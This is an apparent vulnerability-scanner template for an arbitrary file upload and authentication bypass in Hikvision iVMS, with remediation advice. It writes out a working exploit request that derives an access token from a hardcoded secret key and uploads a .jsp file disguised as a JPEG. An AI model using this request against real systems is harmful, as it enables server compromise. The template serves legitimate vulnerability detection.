id: hikvision-ivms-file-upload-bypass

info:
  name: Hikvison iVMS - 任意文件上传漏洞
  author: SleepingBag945
  severity: critical
  description: |
    该模板用于检测 Hikvison iVMS - 任意文件上传漏洞。该类漏洞通常源于上传接口缺少文件类型、路径或执行权限控制，导致恶意文件可被写入服务器。模板主要向 `/eps/api/resourceOperations/upload?token={变量}` 等路径发送探测请求，并根据响应中的 `"success":true`、`"resourceName":` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可上传恶意脚本、WebShell 或伪装文件，进而执行代码或长期控制站点。
    - 若上传目录可被 Web 服务器解析，漏洞可能直接导致服务器失陷和业务数据泄露。
  remediation: |
    - 对上传文件执行扩展名、MIME、魔数和内容校验，并使用随机文件名保存到不可执行目录。
    - 禁止上传目录执行脚本，分离静态文件域名和应用执行环境。
    - 清理历史上传文件，排查 WebShell、异常访问日志和新增系统账号。
  reference:
    - https://blog.csdn.net/qq_41904294/article/details/130807691
  metadata:
    verified: true
    max-request: 1
    fofa-query: icon_hash="-911494769"
  tags: hikvision,ivms,intrusive,fileupload,auth-bypass,vuln

http:
  - raw:
      - |
        POST /eps/api/resourceOperations/upload?token={{to_upper(md5(concat("{{RootURL}}","/eps/api/resourceOperations/uploadsecretKeyIbuilding")))}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo

        ------WebKitFormBoundaryGEJwiloiPo
        Content-Disposition: form-data; name="fileUploader";filename="{{randstr}}.jsp"
        Content-Type: image/jpeg

        {{randstr}}
        ------WebKitFormBoundaryGEJwiloiPo%20

    matchers:
      - type: word
        part: body
        words:
          - '"success":true'
          - '"resourceName":'
        condition: and
